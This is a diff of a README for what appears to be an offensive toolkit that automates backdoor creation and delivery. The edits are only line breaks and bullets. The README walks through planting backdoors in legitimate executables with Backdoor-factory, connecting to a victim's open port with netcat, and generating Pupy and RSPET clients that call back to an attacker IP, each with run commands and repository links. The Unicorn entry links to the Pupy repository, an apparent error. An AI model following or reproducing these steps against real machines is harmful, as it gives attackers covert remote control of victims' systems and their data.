@@ -17,6 +17,7 @@ It's a tool that automate:
 
 ## Example
 Using Kali2 as the attacker with IP: 192.168.0.100
+
 Using any machine as the victim in the same network as the attacker.
 
 Run in Kali:
@@ -58,7 +59,9 @@ python ./handler.py <IP_attacker>
 + Unicorn
 
 ## Backdoor-factory
-The backdoor-factory introduce the backdoor inside executables. If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
+The backdoor-factory introduce the backdoor inside executables.
+If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
+
 https://github.com/secretsquirrel/the-backdoor-factory.git
 
 ## MiaoMiao
@@ -66,6 +69,7 @@ This backdoor open a port in the victims machine and the attacker connects to it
 To use this backdoor you have to run:
 + Victim: Run src_backdoor > server_dist > newest_version
 + Attacker: nc IP_Victim 55555 -vv
+
 https://github.com/marc0l92/MiaoMiao_project.git
 
 ## Msfvenom
@@ -73,17 +77,20 @@ Of course.
 
 ## Pupy
 Creates differents types of backdoors and use it's own listener. It is all automated and the process followed to use these backdoors is:
-Victim: Run the file create using ./pupygen.py -f lin_x64  connect --host IP_Attacker
-Attacker: ./pupysh.py
++ Victim: Run the file create using ./pupygen.py -f lin_x64  connect --host IP_Attacker
++ Attacker: ./pupysh.py
+
 https://github.com/n1nj4sec/pupy.git
 
 ## RSPET
 To use this backdoor you have to run:
-Victim: Run python RSPET_folder/Client/rspet_client.py <IP_Attacker>
-Attacker: (This part is automated) Run Server > rspet_server.py 
++ Victim: Run python RSPET_folder/Client/rspet_client.py <IP_Attacker>
++ Attacker: (This part is automated) Run Server > rspet_server.py 
+
 https://github.com/panagiks/RSPET.git
 
 ## Unicorn
 Creates differents types of backdoors and it is all automated.
 Use metasploit as listener.
+
 https://github.com/n1nj4sec/pupy.git
